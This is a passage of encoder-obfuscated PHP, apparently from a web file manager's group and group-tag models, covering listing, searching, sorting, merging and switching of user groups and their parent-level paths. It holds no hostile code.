Model($ÃóŠÛòù[902])->groupRootRemove($½Ëãå›µ); $this->_clearCache($Äº¤èˆ[$ÃóŠÛòù[192]]); return $this->where($é£şÍí¾)->delete(); } protected function groupSort($íÛĞ€Ãİ) { $ŠŞğæ‘ =& $_SERVER[¿ğÚ‰±–]; $€„É¡½­ = array(); foreach ($íÛĞ€Ãİ as $ŠÍ»“¬Å => $°¹Ø±¹©) { $€„É¡½­[] = array($ŠŞğæ‘[1976], $°¹Ø±¹©, $ŠŞğæ‘[2000], $ŠÍ»“¬Å + 1); } $this->saveAll($€„É¡½­); } public function listData() { $¹êôŒõ› = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¹êôŒõ›[$_SERVER[¿ğÚ‰±–][445]]); return $¹êôŒõ›; } private function _makeOrder($õ’‡òì = '') { $¿˜ÜŸ— =& $_SERVER[¿ğÚ‰±–]; $äôâğÒ = array($¿˜ÜŸ—[1976], $¿˜ÜŸ—[32], $¿˜ÜŸ—[1964], $¿˜ÜŸ—[231]); $ğ­ı÷½ = array($¿˜ÜŸ—[523] => $¿˜ÜŸ—[524], $¿˜ÜŸ—[525] => $¿˜ÜŸ—[526]); $¹¬ô”ñ© = Input::get($¿˜ÜŸ—[530], $¿˜ÜŸ—[7], $¿˜ÜŸ—[1980], $äôâğÒ); $ÜÄÅ¾ÍÕ = Input::get($¿˜ÜŸ—[531], $¿˜ÜŸ—[7], $¿˜ÜŸ—[2071], array($¿˜ÜŸ—[2071], $¿˜ÜŸ—[525])); $ÜÄÅ¾ÍÕ = $ğ­ı÷½[$ÜÄÅ¾ÍÕ]; $õ’‡òì = $õ’‡òì . "{$¹¬ô”ñ©}\x20{$ÜÄÅ¾ÍÕ}\54\x20\147\162\157\x75\x70\x49\x44\x20\141\163\143"; return $this->order($õ’‡òì); } public function listChild($ãÂ¥Îº‘) { $ÇÀàĞ =& $_SERVER[¿ğÚ‰±–]; $‚³Õ¡ë• = $this->where(array($ÇÀàĞ[192] => $ãÂ¥Îº‘))->_makeOrder()->selectPage(200); $this->_listDataApply($‚³Õ¡ë•[$ÇÀàĞ[445]]); return $‚³Õ¡ë•; } public function listChildIds($í®Ì×ùš) { $¢„°Á¼Ğ =& $_SERVER[¿ğÚ‰±–]; if (is_string($÷ëñ©éï)) { $í®Ì×ùš = explode($¢„°Á¼Ğ[50], $í®Ì×ùš); } $ÒÓÖ©Çš = $this->where(array($¢„°Á¼Ğ[1976] => array($¢„°Á¼Ğ[7], $í®Ì×ùš)))->field($¢„°Á¼Ğ[2072])->select(); if (!$ÒÓÖ©Çš) { return !1; } $«©İ–Ø¼ = array(); foreach ($ÒÓÖ©Çš as $¿şÂÙßö) { $«©İ–Ø¼[] = "\163\145\154\145\143\x74\x20\x67\x72\157\x75\x70\111\104\40\146\x72\x6f\155\x20\140\x67\162\x6f\165\x70\x60\x20\167\150\x65\162\145\x20\160\141\x72\x65\156\164\x4c\x65\x76\x65\154\x20\154\x69\x6b\x65\x20\47{$¿şÂÙßö[$¢„°Á¼Ğ[584]]}{$¿şÂÙßö[$¢„°Á¼Ğ[1976]]}\54\45\x27"; } $«©İ–Ø¼ = implode($¢„°Á¼Ğ[2073], $«©İ–Ø¼); $ÒÓÖ©Çš = $this->query($«©İ–Ø¼); if (!$ÒÓÖ©Çš) { return array(); } $í®Ì×ùš = array_to_keyvalue($ÒÓÖ©Çš, $¢„°Á¼Ğ[12], $¢„°Á¼Ğ[1976]); return array_unique($í®Ì×ùš); } public function listByID($Ë¨ÌŸç¶) { $îËùŒ„ =& $_SERVER[¿ğÚ‰±–]; if (!$Ë¨ÌŸç¶) { return array(); } $Åñº°«ï = array($îËùŒ„[1976] => array($îËùŒ„[7], $Ë¨ÌŸç¶)); $»ß®Èì = $this->where($Åñº°«ï)->select(); $»ß®Èì = array_sort_keep($»ß®Èì, $îËùŒ„[1976], $Ë¨ÌŸç¶); $this->_listDataApply($»ß®Èì); return $»ß®Èì; } public function listSearch($Ôıåü¤‡) { $¶¦àû¼ =& $_SERVER[¿ğÚ‰±–]; $Ç« ®«· = trim($Ôıåü¤‡[$¶¦àû¼[2074]]); $ˆÔ¼ƒ¯˜ = explode($¶¦àû¼[53], $Ç« ®«·); if (!$Ç« ®«· || count($ˆÔ¼ƒ¯˜) == 1) { return $this->listSearchNow($Ôıåü¤‡); } $–³ñ‡û = array($¶¦àû¼[445] => array()); foreach ($ˆÔ¼ƒ¯˜ as $²ß‹¸Œ±) { if (!trim($²ß‹¸Œ±)) { continue; } $Ôıåü¤‡[$¶¦àû¼[2074]] = $²ß‹¸Œ±; $±ß¬°ôï = $this->listSearchNow($Ôıåü¤‡); $–³ñ‡û[$¶¦àû¼[445]] = array_merge($–³ñ‡û[$¶¦àû¼[445]], $±ß¬°ôï[$¶¦àû¼[445]]); } $–³ñ‡û[$¶¦àû¼[445]] = array_unique_by_key($–³ñ‡û[$¶¦àû¼[445]], $¶¦àû¼[1976]); $–³ñ‡û[$¶¦àû¼[442]] = array($¶¦àû¼[443] => count($–³ñ‡û[$¶¦àû¼[445]]), $¶¦àû¼[439] => 20, $¶¦àû¼[429] => 1, $¶¦àû¼[444] => 1); return $–³ñ‡û; } public function listSearchNow($—«¹»¾®) { $æ•Æ¥ßÃ =& $_SERVER[¿ğÚ‰±–]; $ñ¢†¾Øà = trim($—«¹»¾®[$æ•Æ¥ßÃ[2074]]); $Ï•ŞØú = isset($—«¹»¾®[$æ•Æ¥ßÃ[2075]]) ? $—«¹»¾®[$æ•Æ¥ßÃ[2075]] : !1; if (!trim($ñ¢†¾Øà)) { return !1; } $ñ¢†¾Øà = str_replace($æ•Æ¥ßÃ[2076], $æ•Æ¥ßÃ[2077], $ñ¢†¾Øà); $Åµ—Ì¢ = array($æ•Æ¥ßÃ[1976] => array($æ•Æ¥ßÃ[459], "{$ñ¢†¾Øà}\x25"), $æ•Æ¥ßÃ[32] => array($æ•Æ¥ßÃ[459], "\x25{$ñ¢†¾Øà}\x25"), $æ•Æ¥ßÃ[1085] => $æ•Æ¥ßÃ[2078]); if ($Ï•ŞØú) { $Ç‰õôõ = $this->getInfoSimple($Ï•ŞØú); $¸¦”Ú¾³ = $Ç‰õôõ[$æ•Æ¥ßÃ[584]] . $Ï•ŞØú . $æ•Æ¥ßÃ[613]; $Åµ—Ì¢ = array($Åµ—Ì¢, array($æ•Æ¥ßÃ[584] => array($æ•Æ¥ßÃ[459], $¸¦”Ú¾³))); } $Åµ—Ì¢ = $this->parseWhereLike($Åµ—Ì¢); $ªÒ”¯Ú¯ = $this->_makeOrder()->where($Åµ—Ì¢)->selectPage(20); $ªÒ”¯Ú¯ = $ªÒ”¯Ú¯ ? $ªÒ”¯Ú¯ : array($æ•Æ¥ßÃ[445] => array(), $æ•Æ¥ßÃ[442] => array()); if (!$ªÒ”¯Ú¯ || count($ªÒ”¯Ú¯[$æ•Æ¥ßÃ[445]]) < 5 && Input::check($ñ¢†¾Øà, $æ•Æ¥ßÃ[394])) { $¯óõ‡ç‘ = $this->groupChildrenAll($Ï•ŞØú); $¯ñÀ÷²” = $this->_searchFromMeta($æ•Æ¥ßÃ[537], $ñ¢†¾Øà, 10, $¯óõ‡ç‘); $Ôíññì  = $this->_searchFromMeta($æ•Æ¥ßÃ[538], $ñ¢†¾Øà, 10, $¯óõ‡ç‘); $Á–Úê¦ú = array_merge($¯ñÀ÷²”, $Ôíññì , $ªÒ”¯Ú¯[$æ•Æ¥ßÃ[445]]); $ªÒ”¯Ú¯[$æ•Æ¥ßÃ[445]] = array_unique_by_key($Á–Úê¦ú, $æ•Æ¥ßÃ[1976]); $ªÒ”¯Ú¯[$æ•Æ¥ßÃ[442]][$æ•Æ¥ßÃ[443]] = count($ªÒ”¯Ú¯[$æ•Æ¥ßÃ[445]]); $ªÒ”¯Ú¯[$æ•Æ¥ßÃ[442]][$æ•Æ¥ßÃ[444]] = ceil($ªÒ”¯Ú¯[$æ•Æ¥ßÃ[442]][$æ•Æ¥ßÃ[443]] / $ªÒ”¯Ú¯[$æ•Æ¥ßÃ[442]][$æ•Æ¥ßÃ[439]]); } $this->_listDataApply($ªÒ”¯Ú¯[$æ•Æ¥ßÃ[445]]); return $ªÒ”¯Ú¯; } protected function groupChildrenAll($´êæ»üƒ) { $«Í¾­º =& $_SERVER[¿ğÚ‰±–]; if (!$´êæ»üƒ) { return !1; } if (!is_array($´êæ»üƒ)) { $´êæ»üƒ = array($´êæ»üƒ); } $…¤ˆ—ƒÃ = $´êæ»üƒ; foreach ($´êæ»üƒ as $óâª®¤¹) { $¡•ÂÀ÷ò = $this->getInfoSimple($óâª®¤¹); $Ô’¸½ = array($«Í¾­º[584] => array($«Í¾­º[459], $¡•ÂÀ÷ò[$«Í¾­º[584]] . $óâª®¤¹ . $«Í¾­º[613])); $Šù¬áï® = $this->field($«Í¾­º[1976])->where($Ô’¸½)->select(); $…¤ˆ—ƒÃ = array_merge($…¤ˆ—ƒÃ, array_to_keyvalue($Šù¬áï®, $«Í¾­º[12], $«Í¾­º[1976])); } return array_unique($…¤ˆ—ƒÃ); } private function _searchFromMeta($ªÄüôúÅ, $ëÚøËÎü, $Û¬÷Ïıµ, $·ı“Ç÷Ö) { $¶œìù÷º =& $_SERVER[¿ğÚ‰±–]; $ëÚøËÎü = strtolower($ëÚøËÎü); $æ˜ö§• = array($¶œìù÷º[97] => $ªÄüôúÅ, $¶œìù÷º[450] => array($¶œìù÷º[459], "\45{$ëÚøËÎü}\x25")); $æ˜ö§• = $this->parseWhereLike($æ˜ö§•); if ($·ı“Ç÷Ö) { $æ˜ö§•[$¶œìù÷º[1976]] = array($¶œìù÷º[7], $·ı“Ç÷Ö); } $Ï¶€¨¶ = Model($¶œìù÷º[2079])->where($æ˜ö§•)->limit($Û¬÷Ïıµ)->select(); if (!$Ï¶€¨¶) { return array(); } $Ï¶€¨¶ = array_to_keyvalue($Ï¶€¨¶, $¶œìù÷º[12], $¶œìù÷º[1976]); $„ÈãˆÀü = $this->where(array($¶œìù÷º[2068] => array($¶œìù÷º[7], $Ï¶€¨¶)))->select(); if (!$„ÈãˆÀü) { return array(); } return $„ÈãˆÀü; } protected function _listDataApplyItem($¼ó¬ôª¬) { $…Å‡¿½Á = array($¼ó¬ôª¬); $this->_listDataApply($…Å‡¿½Á); return $…Å‡¿½Á[0]; } protected function _listDataApply(&$¥‰ÜóßÔ) { $Ğ§°øš· =& $_SERVER[¿ğÚ‰±–]; if (!$¥‰ÜóßÔ) { return; } $“‰åÍû„ = array_to_keyvalue($¥‰ÜóßÔ, $Ğ§°øš·[12], $Ğ§°øš·[1976]); $this->_listAppendChildren($¥‰ÜóßÔ); $this->_listAppendChildrenMember($¥‰ÜóßÔ); $this->_listAppendMeta($¥‰ÜóßÔ, $“‰åÍû„); $this->_listAppendParent($¥‰ÜóßÔ); $this->_listAppendSourceRoot($¥‰ÜóßÔ, $“‰åÍû„); } private function _listAppendChildren(&$ÌÂ†·ı) { $¦İïĞĞ½ =& $_SERVER[¿ğÚ‰±–]; $Ì±æ“˜£ = array_to_keyvalue($ÌÂ†·ı, $¦İïĞĞ½[12], $¦İïĞĞ½[1976]); $åÜ²¢Ó¼ = array($¦İïĞĞ½[192] => array($¦İïĞĞ½[7], $Ì±æ“˜£)); $‹Ò¨ş‰ = array($¦İïĞĞ½[192], $¦İïĞĞ½[2080] => $¦İïĞĞ½[565]); $Ñõä‘·¯ = $this->field($‹Ò¨ş‰)->where($åÜ²¢Ó¼)->group($¦İïĞĞ½[192])->select(); $”ä ØŞ™ = array_to_keyvalue($Ñõä‘·¯, $¦İïĞĞ½[192], $¦İïĞĞ½[565]); foreach ($ÌÂ†·ı as &$“‘Š±“) { $ˆˆÅ‰‚ß = $“‘Š±“[$¦İïĞĞ½[1976]]; $“‘Š±“[$¦İïĞĞ½[2081]] = isset($”ä ØŞ™[$ˆˆÅ‰‚ß]) ? intval($”ä ØŞ™[$ˆˆÅ‰‚ß]) : !1; } unset($“‘Š±“); } private function _listAppendChildrenMember(&$üÌóÁºõ) { $¦³ÈƒÓÃ =& $_SERVER[¿ğÚ‰±–]; $°°Æ½ºª = array_to_keyvalue($üÌóÁºõ, $¦³ÈƒÓÃ[12], $¦³ÈƒÓÃ[1976]); $×ôÑî¢¤ = array($¦³ÈƒÓÃ[1976] => array($¦³ÈƒÓÃ[7], $°°Æ½ºª)); $Î˜¹Ì“¨ = array($¦³ÈƒÓÃ[1976], $¦³ÈƒÓÃ[2080] => $¦³ÈƒÓÃ[565]); $­²óÏ¨ = Model($¦³ÈƒÓÃ[2070])->field($Î˜¹Ì“¨)->where($×ôÑî¢¤)->group($¦³ÈƒÓÃ[1976])->select(); $Ö¡ÑªÁª = array_to_keyvalue($­²óÏ¨, $¦³ÈƒÓÃ[1976], $¦³ÈƒÓÃ[565]); foreach ($üÌóÁºõ as &$ˆ¡üßÙô) { $é§’¯» = $ˆ¡üßÙô[$¦³ÈƒÓÃ[1976]]; $ˆ¡üßÙô[$¦³ÈƒÓÃ[2082]] = isset($Ö¡ÑªÁª[$é§’¯»]) ? intval($Ö¡ÑªÁª[$é§’¯»]) : !1; } unset($ˆ¡üßÙô); } private function _listAppendMeta(&$È©à€ˆ³, $ùĞóô¼Ã) { $ó£ôÄò« =& $_SERVER[¿ğÚ‰±–]; $¯Á®¾¼Ä = array($ó£ôÄò«[1976] => array($ó£ôÄò«[7], $ùĞóô¼Ã)); $›Üöò˜¼ = Model($ó£ôÄò«[2069])->where($¯Á®¾¼Ä)->select(); $›Üöò˜¼ = array_to_keyvalue_group($›Üöò˜¼, $ó£ôÄò«[1976]); foreach ($›Üöò˜¼ as &$¶«ôıÓ) { $¶«ôıÓ = array_to_keyvalue($¶«ôıÓ, $ó£ôÄò«[97], $ó£ôÄò«[450]); } unset($¶«ôıÓ); foreach ($È©à€ˆ³ as &$ÖÀ„‡Ÿ™) { $ÖÀ„‡Ÿ™[$ó£ôÄò«[539]] = array(); if (isset($›Üöò˜¼[$ÖÀ„‡Ÿ™[$ó£ôÄò«[1976]]])) { $ÖÀ„‡Ÿ™[$ó£ôÄò«[539]] = $›Üöò˜¼[$ÖÀ„‡Ÿ™[$ó£ôÄò«[1976]]]; } } unset($ÖÀ„‡Ÿ™); } protected function parentLevelArray($×…ªà‡ù) { $ô©’â¹å =& $_SERVER[¿ğÚ‰±–]; $×…ªà‡ù = explode($ô©’â¹å[50], trim($×…ªà‡ù, $ô©’â¹å[50])); $×…ªà‡ù = array_remove_value($×…ªà‡ù, $ô©’â¹å[228]); return $×…ªà‡ù; } protected function parentInGroup($•Ë‰°Ÿ, $ö ¢˜¸…) { $Ú…ò¶âí =& $_SERVER[¿ğÚ‰±–]; $õÉ«¶”» = $this->getInfoSimple($•Ë‰°Ÿ); if (!$õÉ«¶”») { return !0; } $Ûä¨ç¼Œ = $this->parentLevelArray($õÉ«¶”»[$Ú…ò¶âí[584]]); $Ûä¨ç¼Œ[] = $•Ë‰°Ÿ; foreach ($Ûä¨ç¼Œ as $•Ë‰°Ÿ) { if (in_array($•Ë‰°Ÿ . $Ú…ò¶âí[12], $ö ¢˜¸…)) { return !0; } } return !1; } private function _listAppendParent(&$©ŒùÜœ) { $ÙÖŞÛŸ =& $_SERVER[¿ğÚ‰±–]; $Õè™„·Î = array(); foreach ($©ŒùÜœ as &$¥í¡Êê¿) { $Õè™„·Î[$¥í¡Êê¿[$ÙÖŞÛŸ[1976]]] = $¥í¡Êê¿[$ÙÖŞÛŸ[32]]; $‡²®Áºº = $this->parentLevelArray($¥í¡Êê¿[$ÙÖŞÛŸ[584]]); foreach ($‡²®Áºº as $ßØÔÔÙ) { if (!isset($Õè™„·Î[$ßØÔÔÙ])) { $Õè™„·Î[$ßØÔÔÙ] = 0; } } } unset($¥í¡Êê¿); foreach ($Õè™„·Î as $´³÷İß¥ => $ØØÑãÆ) { if ($ØØÑãÆ) { continue; } $šß»…°’ = $this->getInfoSimple($´³÷İß¥); $Õè™„·Î[$´³÷İß¥] = $šß»…°’[$ÙÖŞÛŸ[32]]; } $À¨±¤æÂ = $GLOBALS[$ÙÖŞÛŸ[6]][$ÙÖŞÛŸ[92]][$ÙÖŞÛŸ[2083]]; if (KodUser::isRoot()) { $À¨±¤æÂ = !1; } foreach ($©ŒùÜœ as &$¥í¡Êê¿) { $‡²®Áºº = $this->parentLevelArray($¥í¡Êê¿[$ÙÖŞÛŸ[584]]); $­Ë‰ßôä = $ÙÖŞÛŸ[12]; foreach ($‡²®Áºº as $´³÷İß¥ => $ßØÔÔÙ) { if ($À¨±¤æÂ && $´³÷İß¥ == 0) { continue; } $­Ë‰ßôä .= $Õè™„·Î[$ßØÔÔÙ] . $ÙÖŞÛŸ[8]; } if ($‡²®Áºº) { $­Ë‰ßôä .= $¥í¡Êê¿[$ÙÖŞÛŸ[32]]; } $¥í¡Êê¿[$ÙÖŞÛŸ[589]] = str_replace($ÙÖŞÛŸ[592], $ÙÖŞÛŸ[8], $­Ë‰ßôä); } unset($¥í¡Êê¿); } private function _listAppendSourceRoot(&$ƒ«ªİº—, $‘úƒ®‘–) { $ŠÑ†ü³ =& $_SERVER[¿ğÚ‰±–]; $Š‰šÁ´Õ = Model($ŠÑ†ü³[902])->listSourceRoot(SourceModel::TYPE_GROUP, $‘úƒ®‘–); $Š‰šÁ´Õ = array_to_keyvalue($Š‰šÁ´Õ, $ŠÑ†ü³[569]); $Š‰šÁ´Õ = array_remove_key($Š‰šÁ´Õ, $ŠÑ†ü³[569]); foreach ($ƒ«ªİº— as &$Û¡ùÔÇŒ) { $Û¡ùÔÇŒ[$ŠÑ†ü³[90]] = $Š‰šÁ´Õ[$Û¡ùÔÇŒ[$ŠÑ†ü³[1976]]] ? $Š‰šÁ´Õ[$Û¡ùÔÇŒ[$ŠÑ†ü³[1976]]] : array(); } unset($Û¡ùÔÇŒ); } protected function groupMerge($ÚŞ‰÷äÔ) { $ÚŞ‰÷äÔ = array_values(array_unique($ÚŞ‰÷äÔ)); $’Ú½Ø‰ö = array(); for ($ë­¿§ìã = 0; $ë­¿§ìã < count($ÚŞ‰÷äÔ); $ë­¿§ìã++) { $ëõ³¨Ô = !1; for ($æ“Çºğë = 0; $æ“Çºğë < count($ÚŞ‰÷äÔ); $æ“Çºğë++) { if ($ë­¿§ìã == $æ“Çºğë) { continue; } if ($this->isParentOf($ÚŞ‰÷äÔ[$æ“Çºğë], $ÚŞ‰÷äÔ[$ë­¿§ìã])) { $ëõ³¨Ô = !0; break; } } if (!$ëõ³¨Ô) { $’Ú½Ø‰ö[] = $ÚŞ‰÷äÔ[$ë­¿§ìã]; } } return $’Ú½Ø‰ö; } protected function isParentOf($ÚÙéş¹Ë, $Ã´©Õ–Ã) { $ çö“¦ =& $_SERVER[¿ğÚ‰±–]; if (!$ÚÙéş¹Ë || !$Ã´©Õ–Ã || $ÚÙéş¹Ë == $Ã´©Õ–Ã) { return !1; } $öÓ–—û = $this->getInfoSimple($ÚÙéş¹Ë); $˜çß’‘ = $this->getInfoSimple($Ã´©Õ–Ã); $Â¶†ÃÈ = $öÓ–—û[$ çö“¦[584]] . $ÚÙéş¹Ë . $ çö“¦[50]; if (substr($˜çß’‘[$ çö“¦[584]], 0, strlen($Â¶†ÃÈ)) == $Â¶†ÃÈ) { return !0; } return !1; } public function groupShowRoot($éşù£ßÏ, $î«²¹¾Ï = false) { $‰—™ÏÊƒ =& $_SERVER[¿ğÚ‰±–]; $²„ÅÌŒ = $this->getInfo($éşù£ßÏ); if (!$²„ÅÌŒ) { return array(); } $ƒÂõûÈ× = $this->parentLevelArray($²„ÅÌŒ[$‰—™ÏÊƒ[584]]); $·Ú•É¦Å = array($éşù£ßÏ); if (count($ƒÂõûÈ×) == 0) { return $·Ú•É¦Å; } if ($î«²¹¾Ï && count($ƒÂõûÈ×) == 1) { return $·Ú•É¦Å; } if (!$²„ÅÌŒ[$‰—™ÏÊƒ[539]] || !isset($²„ÅÌŒ[$‰—™ÏÊƒ[539]][$‰—™ÏÊƒ[2066]]) || $²„ÅÌŒ[$‰—™ÏÊƒ[539]][$‰—™ÏÊƒ[2066]] == $‰—™ÏÊƒ[854]) { return $this->groupShowRoot($ƒÂõûÈ×[count($ƒÂõûÈ×) - 1], $î«²¹¾Ï); } if ($²„ÅÌŒ[$‰—™ÏÊƒ[539]][$‰—™ÏÊƒ[2066]] == $‰—™ÏÊƒ[433]) { $ğêğ¼å = explode($‰—™ÏÊƒ[50], $²„ÅÌŒ[$‰—™ÏÊƒ[539]][$‰—™ÏÊƒ[2067]]); if ($ğêğ¼å) { $·Ú•É¦Å = array_merge($·Ú•É¦Å, $ğêğ¼å); } } return $·Ú•É¦Å; } protected function resetParentLevel() { $á†õı§‰ =& $_SERVER[¿ğÚ‰±–]; $»ÃÃ¿Éô = $á†õı§‰[1976]; $·µ‹ƒåÂ = $this->select(); $·µ‹ƒåÂ = array_to_keyvalue($·µ‹ƒåÂ, $»ÃÃ¿Éô); foreach ($·µ‹ƒåÂ as $ìèªĞ·ß) { $Î±§•‘” = $ìèªĞ·ß; $¾µùˆÌÔ = array(); while ($Î±§•‘”[$á†õı§‰[192]] != 0) { $¾µùˆÌÔ[] = $Î±§•‘”[$á†õı§‰[192]]; $Î±§•‘” = $·µ‹ƒåÂ[$Î±§•‘”[$á†õı§‰[192]]]; } $¾µùˆÌÔ[] = 0; $¾µùˆÌÔ = $á†õı§‰[50] . implode($á†õı§‰[50], array_reverse($¾µùˆÌÔ)) . $á†õı§‰[50]; $this->setNamePinyin($ìèªĞ·ß[$»ÃÃ¿Éô], $ìèªĞ·ß[$á†õı§‰[32]]); $this->where(array($»ÃÃ¿Éô => $ìèªĞ·ß[$»ÃÃ¿Éô]))->save(array($á†õı§‰[652] => $¾µùˆÌÔ)); } return $·µ‹ƒåÂ; } public function groupNameAuto($¢ÆÌ®Ö·, $Æã«î¸®) { $å¯Ğ‰¤ =& $_SERVER[¿ğÚ‰±–]; $şåğ•ş = $this->where(array($å¯Ğ‰¤[477] => $¢ÆÌ®Ö·))->getField($å¯Ğ‰¤[32], !0); if (!$şåğ•ş || !in_array($Æã«î¸®, $şåğ•ş)) { return $Æã«î¸®; } for ($“œÖª† = 1; $“œÖª† <= count($şåğ•ş) + 1; $“œÖª†++) { $¿©ÑÂ« = $Æã«î¸® . "\x28{$“œÖª†}\51"; if (!in_array($¿©ÑÂ«, $şåğ•ş)) { return $¿©ÑÂ«; } } } public function groupSwitch($Ë«èìßÖ, $Ñ§Â±œÛ) { $ë¥Œ– =& $_SERVER[¿ğÚ‰±–]; $†øÔ¢ø = array($ë¥Œ–[1976] => array($ë¥Œ–[7], array($Ë«èìßÖ, $Ñ§Â±œÛ))); $¥Å¦Âı” = $this->where($†øÔ¢ø)->select(); $¥Å¦Âı” = array_to_keyvalue($¥Å¦Âı”, $ë¥Œ–[1976]); if (!isset($¥Å¦Âı”[$Ë«èìßÖ]) || !isset($¥Å¦Âı”[$Ñ§Â±œÛ]) || $¥Å¦Âı”[$Ë«èìßÖ][$ë¥Œ–[192]] == 0) { return !1; } $†øÔ¢ø = array($ë¥Œ–[1976] => $Ë«èìßÖ); $±ä¢ºŞ‘ = Model($ë¥Œ–[2070])->where($†øÔ¢ø)->select(); if (!$±ä¢ºŞ‘) { $±ä¢ºŞ‘ = array(); } foreach ($±ä¢ºŞ‘ as $®şó³˜‚) { $»¢æò¸¡ = $®şó³˜‚[$ë¥Œ–[1777]]; $†øÔ¢ø = array($ë¥Œ–[1777] => $»¢æò¸¡, $ë¥Œ–[1976] => $Ñ§Â±œÛ); $¾›‰Ò = Model($ë¥Œ–[2070])->where($†øÔ¢ø)->find(); if (!$¾›‰Ò) { $ïüÚ‹­› = array($Ñ§Â±œÛ => $®şó³˜‚[$ë¥Œ–[2084]]); Model($ë¥Œ–[598])->userGroupAdd($»¢æò¸¡, $ïüÚ‹­›); } Model($ë¥Œ–[598])->userGroupRemove($»¢æò¸¡, $Ë«èìßÖ); } $†øÔ¢ø = array($ë¥Œ–[190] => 2, $ë¥Œ–[192] => 0, $ë¥Œ–[485] => 1, $ë¥Œ–[569] => array($ë¥Œ–[7], array($Ë«èìßÖ, $Ñ§Â±œÛ))); $›ÌŸÆ‹ì = Model($ë¥Œ–[902])->where($†øÔ¢ø)->field($ë¥Œ–[2085])->select(); $›ÌŸÆ‹ì = array_to_keyvalue($›ÌŸÆ‹ì, $ë¥Œ–[569], $ë¥Œ–[193]); $´ˆ»ÜáÉ = !empty($›ÌŸÆ‹ì[$Ë«èìßÖ]) ? $›ÌŸÆ‹ì[$Ë«èìßÖ] : !1; if ($´ˆ»ÜáÉ) { if (!$›ÌŸÆ‹ì[$Ñ§Â±œÛ]) { $›ÌŸÆ‹ì[$Ñ§Â±œÛ] = Model($ë¥Œ–[902])->groupRootAdd($Ñ§Â±œÛ); } $äş©ÖÑÊ = $›ÌŸÆ‹ì[$Ñ§Â±œÛ]; $†øÔ¢ø = array($ë¥Œ–[192] => $´ˆ»ÜáÉ); $›ÌŸÆ‹ì = Model($ë¥Œ–[902])->where($†øÔ¢ø)->field($ë¥Œ–[2086])->select(); if (!$›ÌŸÆ‹ì) { $›ÌŸÆ‹ì = array(); } Model($ë¥Œ–[902])->moveClearAuth = !1; foreach ($›ÌŸÆ‹ì as $‘Ä”€ï) { $÷‹³ŠŸ = $‘Ä”€ï[$ë¥Œ–[485]] == $ë¥Œ–[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ë¥Œ–[902])->move($‘Ä”€ï[$ë¥Œ–[193]], $äş©ÖÑÊ, $÷‹³ŠŸ); } Model($ë¥Œ–[902])->moveClearAuth = !0; $†øÔ¢ø = array($ë¥Œ–[190] => 2, $ë¥Œ–[569] => $Ë«èìßÖ); $›ÑïÊÔë = array($ë¥Œ–[569] => $Ñ§Â±œÛ); Model($ë¥Œ–[2087])->where($†øÔ¢ø)->save($›ÑïÊÔë); Model($ë¥Œ–[2088])->where($†øÔ¢ø)->save($›ÑïÊÔë); } $this->_changeChildLevel($¥Å¦Âı”[$Ë«èìßÖ], $¥Å¦Âı”[$Ñ§Â±œÛ], !0); $this->where(array($ë¥Œ–[192] => $Ë«èìßÖ))->save(array($ë¥Œ–[192] => $Ñ§Â±œÛ)); $this->_clearChildrenCache($¥Å¦Âı”[$Ñ§Â±œÛ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($Î“¤ü¶) { $½£¥û• =& $_SERVER[¿ğÚ‰±–]; return array($½£¥û•[2089] => array($Î“¤ü¶[0], $½£¥û•[2090]), $½£¥û•[2091] => array($Î“¤ü¶[0], $½£¥û•[2092])); } protected function get($†åœùéÚ) { $ö¼òóŒÃ =& $_SERVER[¿ğÚ‰±–]; $±ÔÅ˜Ä„ = Model($ö¼òóŒÃ[585])->metaGet($†åœùéÚ, $ö¼òóŒÃ[2093]); $¿·¯”ô¦ = json_decode($±ÔÅ˜Ä„, !0); return $¿·¯”ô¦ ? $¿·¯”ô¦ : array($ö¼òóŒÃ[2094] => $ö¼òóŒÃ[91], $ö¼òóŒÃ[445] => array()); } protected function set($âë§°â¿, $‰îåÒÅğ) { $°ğšôÒÄ =& $_SERVER[¿ğÚ‰±–]; $‰îåÒÅğ = $‰îåÒÅğ ? $‰îåÒÅğ : array($°ğšôÒÄ[2094] => $°ğšôÒÄ[91], $°ğšôÒÄ[445] => array()); return Model($°ğšôÒÄ[585])->metaSet($âë§°â¿, $°ğšôÒÄ[2093], json_encode($‰îåÒÅğ)); } protected function getByTagID($èµ´Ù¾’, $Ç²Àğ™) { $Šƒ‹Ü—Ä =& $_SERVER[¿ğÚ‰±–]; if (!$èµ´Ù¾’ || !$Ç²Àğ™) { return !1; } if (!Model($Šƒ‹Ü—Ä[585])->getInfoSimple($èµ´Ù¾’)) { return !1; } $Ùüª›Ç÷ = $this->get($èµ´Ù¾’); if (!$Ùüª›Ç÷ || !isset($Ùüª›Ç÷[$Šƒ‹Ü—Ä[445]])) { return !1; } $î´®úĞÇ = array_find_by_field($Ùüª›Ç÷[$Šƒ‹Ü—Ä[445]], $Šƒ‹Ü—Ä[475], $Ç²Àğ™); return is_array($î´®úĞÇ) ? $î´®úĞÇ : !1; } public function listSource($¡ˆÆ›‰ˆ, $à¾Â‘…ã) { $¡­‡Îìµ =& $_SERVER[¿ğÚ‰±–]; if ($à¾Â‘…ã && !is_array($à¾Â‘…ã)) { $à¾Â‘…ã = array($à¾Â‘…ã); } $»‰µ™Ãß = $this->listData($¡ˆÆ›‰ˆ); $³ãù‘Å• = array(); foreach ($»‰µ™Ãß as $ÊÌä™ó„) { $èÜ–Œó = $ÊÌä™ó„[$¡­‡Îìµ[87]]; if (!$èÜ–Œó) { continue; } if (!isset($³ãù‘Å•[$èÜ–Œó])) { $³ãù‘Å•[$èÜ–Œó] = array(); } $³ãù‘Å•[$èÜ–Œó][] = $ÊÌä™ó„[$¡­‡Îìµ[500]]; } $ŞŸÓâ’” = array(); foreach ($³ãù‘Å• as $È‘‚›å« => $ıÁ±Œ¼ª) { $Ã·˜åë© = !0; if (!$à¾Â‘…ã) { $ŞŸÓâ’”[] = $È‘‚›å«; continue; } foreach ($à¾Â‘…ã as $÷÷ÌüÃ—) { if (!in_array($÷÷ÌüÃ—, $ıÁ±Œ¼ª)) { $Ã·˜åë© = !1; break; } } if ($Ã·˜åë©) { $ŞŸÓâ’”[] = $È‘‚›å«; } } if (!$ŞŸÓâ’”) { return array(); } $ûóıûÅ = array($¡­‡Îìµ[491] => array($¡­‡Îìµ[492], $ŞŸÓâ’”), $¡­‡Îìµ[569] => $¡ˆÆ›‰ˆ, $¡­‡Îìµ[190] => SourceModel::TYPE_GROUP); 